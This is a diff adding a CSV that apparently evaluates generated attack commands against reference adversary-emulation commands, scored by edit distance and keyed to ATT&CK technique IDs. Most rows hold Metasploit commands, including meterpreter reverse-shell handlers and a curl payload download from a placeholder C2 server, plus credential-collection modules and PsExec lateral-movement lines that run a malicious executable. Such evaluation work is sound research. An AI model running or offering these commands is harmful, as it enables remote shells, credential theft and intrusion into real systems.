@@ -1,0 +1,57 @@
+file,tool,input_command,matched_command,edit_score,match_found
+command_metasploit_TA0002_T1059.txt,metasploit,powershell.exe -ExecutionPolicy Bypass -File <script_file_path>,`meterpreter > powershell_execute Get-NetComputer`,0.336,True
+command_metasploit_TA0002_T1059.txt,metasploit,"powershell.exe -InputFormat None -Command ""Start-Process -FilePath <program_to_execute> -ArgumentList @('<arg1>', '<arg2>')""",`meterpreter > powershell_import /home/<attacker>/carbanak/Resources/step6/powerview.ps1`,0.291,True
+command_metasploit_TA0002_T1059.txt,metasploit,powershell.exe -File <script_file_path> -WindowStyle Hidden,`meterpreter > powershell_execute Get-NetComputer`,0.294,True
+command_metasploit_TA0002_T1059.txt,metasploit,"powershell.exe -InputFormat None -Command ""Start-Process -FilePath <script_to_execute> -ArgumentList @('<arg1>', '<arg2>')""",`meterpreter > powershell_import /home/<attacker>/carbanak/Resources/step6/powerview.ps1`,0.292,True
+command_metasploit_TA0010_T1041.txt,metasploit,recon/wlan scan_interfaces,`meterpreter > load powershell`,0.246,True
+command_metasploit_TA0010_T1041.txt,metasploit,recon/gather/credentials collect_creds,[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,0.544,True
+command_metasploit_TA0010_T1041.txt,metasploit,escalate/exploit exfil_data <C2_IP> <C2_Port>,`meterpreter > load powershell`,0.237,True
+command_metasploit_TA0011_T1071.txt,metasploit,msfconsole -x 'use exploit/multi/http/download_exec; set PAYLOAD windows/meterpreter/reverse_http; set RHOST <c2_server_ip>; set RPORT 8080; exploit',"```
+    use exploit/multi/handler
+    set payload windows/meterpreter/reverse_https
+    set lport 8080
+    set lhost 192.168.0.4
+    set ExitOnSession False
+    exploit -j
+    ```",0.506,True
+command_metasploit_TA0011_T1071.txt,metasploit,msfconsole -x 'use exploit/multi/http/download_exec; set PAYLOAD windows/meterpreter/reverse_https; set RHOST <c2_server_ip>; set RPORT 8443; set SSL true; exploit',"```
+    use exploit/multi/handler
+    set payload windows/meterpreter/reverse_https
+    set lport 8080
+    set lhost 192.168.0.4
+    set ExitOnSession False
+    exploit -j
+    ```",0.542,True
+command_metasploit_TA0011_T1071.txt,metasploit,msfconsole -x 'use exploit/multi/http/download_exec; set PAYLOAD windows/meterpreter/reverse_tcp; set RHOST <c2_server_ip>; set RPORT 80; set HTTP true; exploit',"```
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set lport 8080
+    set lhost 192.168.0.4
+    set ExitOnSession False
+    exploit -j
+```",0.533,True
+command_metasploit_TA0011_T1071.txt,metasploit,msfconsole -x 'use exploit/multi/http/download_exec; set PAYLOAD windows/meterpreter/reverse_tcp; set RHOST <c2_server_ip>; set RPORT 443; set SSL true; set HTTP false; exploit',"```
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set lport 8080
+    set lhost 192.168.0.4
+    set ExitOnSession False
+    exploit -j
+```",0.525,True
+command_metasploit_TA0011_T1102.txt,metasploit,curl -o <served_payload_file> https://<c2_server>/linux/x64/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.44,True
+command_psexec_TA0002_T1569.txt,psexec,"psexec -s -a 1,2 -c ""C:\Path\To\MaliciousExecutable.exe"" -d","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.23,True
+command_psexec_TA0002_T1569.txt,psexec,"psexec -s -a 1,2 -c ""C:\Path\To\MaliciousExecutable.exe"" -h","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.23,True
+command_psexec_TA0002_T1569.txt,psexec,"psexec -s -a 1,2 -c ""C:\Path\To\MaliciousExecutable.exe"" -l","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.23,True
+command_psexec_TA0008_T1021.txt,psexec,psexec \\<target_computer_name> -s -i cmd.exe,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.311,True
+command_psexec_TA0008_T1021.txt,psexec,psexec \\<target_computer_name> -u <username> -p <password> cmd.exe,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.359,True
+command_psexec_TA0008_T1021.txt,psexec,psexec \\<target_computer_name> -r <remote_service_name>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.251,True
+command_psexec_TA0008_T1021.txt,psexec,psexec \\<target_computer_name> -l -i cmd.exe,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.302,True
+command_psexec_TA0008_T1021.txt,psexec,psexec \\<target_computer_name> -h -i cmd.exe,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.302,True
